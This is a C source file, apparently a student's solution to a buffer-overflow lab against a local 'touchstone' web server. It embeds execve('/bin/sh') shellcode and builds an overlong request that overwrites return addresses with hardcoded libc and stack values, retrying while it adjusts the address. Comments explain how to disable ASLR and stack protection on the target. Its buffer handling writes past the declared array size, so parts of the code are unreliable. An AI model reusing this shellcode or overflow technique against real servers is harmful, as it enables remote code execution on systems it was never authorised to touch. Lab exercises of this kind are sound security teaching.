
/**
 *  运行touchstone时要关闭内存地址随机化，
 *  且touchstone编译时要加上-z execstack -fn-stack-protector
*/





#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/shm.h>
#define NOP 0x90
#define PORT  8989

/*
** construct your shellcode
**create_shellcode.c will help you to create a shellcode.
**fill in it there	 
*/
  const char shellcode[] = "\x31\xc0"
  "\x50"
  "\x68""//sh"
  "\x68""/bin"
  "\x89\xe3"
  "\x50"
  "\x53"
  "\x89\xe1"
  "\x99"
  "\xb0\x0b"
  "\xcd\x80" ;
int main(int argc, char *argv[])
{
  int  port = PORT;
  if (argc>1)
    port = atoi(argv[1]);

  int sock_client = socket(AF_INET,SOCK_STREAM, 0);//sock fd
  
  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);  //server port
  
  addr.sin_addr.s_addr = inet_addr("127.0.0.1");  ///server ip address

  
  if (connect(sock_client, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
      perror("connect");
      exit(1);
    }
 
  printf("sock_client = %d\n",sock_client);
  

  /*
    your task is to exploit your attack..
    step1 : define a buffer array 
    step2 : construct a attack shellcode to the buffer
    step3 : send the buffer to web server to realize your attack
    remember that you must send a request which end up with "\r\n\r\n",if you
    want your browser receice the answer response from server
  */

  //code fill in it
	char *req="GET / HTTP/1.1\r\n\r\n";
  char uri[1065];//uri不能太大，否则会把是getToken的参数fd也覆盖掉，这样getchar就读不到fd程序在getchar内终止
	/*先把返回地址写到字符数组*/
  long *addr_s;
  int i;
  addr_s=(long *)uri;
  for(i=0;i<266;i++)
	 addr_s[i]=0xb7e5f060;
	addr_s[i++]=0xb7e52be0;
   addr_s[i]=  0xbffff000;
		//"/bin/bash"的地址在不同的机器上时不一样的，要重新gdb查找其地址	
  for(i=0;i<strlen(shellcode);i++)
           uri[i]=shellcode[i];
     uri[1073]='\0';
     uri[1072]=' ';
     

 char resp[1024];
 int num = 0;
  write(sock_client,uri,strlen(uri));
/* 
    below show that client send a normal request to the web server
    you should fix the code to realize your attack
  */  
 // char *req ="GET / HTTP/1.1\r\n\r\n";
 
  while(!read(sock_client,&resp[num],1))
  {
    close(sock_client);
    if (connect(sock_client, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
      perror("connect");
      exit(1);
    }
    addr_s[i]  +=1;
    write(sock_client,uri,strlen(uri));
        
  }
  //receive the response from web server
 
 
  while(read (sock_client, &resp[num], 1))
	num++;
  resp[num] = 0;
  printf("Response = %s\n",resp);
  
  close(sock_client);
  
 
 return 0;
}
